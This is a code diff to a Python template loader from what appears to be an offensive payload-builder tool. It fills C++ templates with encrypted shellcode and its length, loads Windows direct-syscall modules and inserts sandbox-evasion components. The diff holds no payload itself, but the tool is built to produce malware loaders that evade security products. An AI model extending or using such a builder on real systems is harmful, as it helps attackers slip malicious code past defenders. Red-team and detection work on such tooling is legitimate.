@@ -56,7 +56,7 @@ class TemplateLoader:
         self.get_build_options()
 
     def copy_new_template_file(self):
-        src_file = f"{Config().get('FOLDERS', 'methods')}/{self.platform}/{self.method}.cpp"
+        src_file = f"{Config().get('FOLDERS', 'methods')}/{self.platform}/{self.method}.esc"
         dest_file = self.template_file
         try:
             if not os.path.isfile(src_file):
@@ -93,12 +93,13 @@ class TemplateLoader:
                     self.process_component(component)
 
     def load_syscalls(self):
-        self.sysCallss = SysCallsControler(self.template_file, self.syscall_method,"False",recovery=self.syswhispers_recovery_method)
-        if self.sysCallss:
-            SysModule = self.sysCallss.get_syscall_module()
-            self.mingw_options.append(SysModule.mingw_options)
-            for component in SysModule.components:
-                    self.process_component(component)
+        if self.platform == "windows_cpp":
+            self.sysCallss = SysCallsControler(self.template_file, self.syscall_method,"False",recovery=self.syswhispers_recovery_method)
+            if self.sysCallss:
+                SysModule = self.sysCallss.get_syscall_module()
+                self.mingw_options.append(SysModule.mingw_options)
+                for component in SysModule.components:
+                        self.process_component(component)
 
     def process_component(self,component):
         if isinstance(component, CallComponent):
@@ -153,6 +154,10 @@ class TemplateLoader:
         shellcodeControler = ShellcodeControler(self.shellcode_variable, self.encryptors_chain)
         #shellcodeControler.test()
         template_content = template_content.replace(shellcode_placeholder,shellcodeControler.get_encrypted_shellcode_c())
+
+        # Replace Shellcode_Len
+        shellcode_placeholder = Config().get('PLACEHOLDERS', 'shellcode_len')
+        template_content = template_content.replace(shellcode_placeholder,str(shellcodeControler.get_encrypted_shellcode_len()))
 
         # Replace SandboxEvasion
         sandboxevasion_placeholder = Config().get('PLACEHOLDERS', 'SANDBOXEVASION')
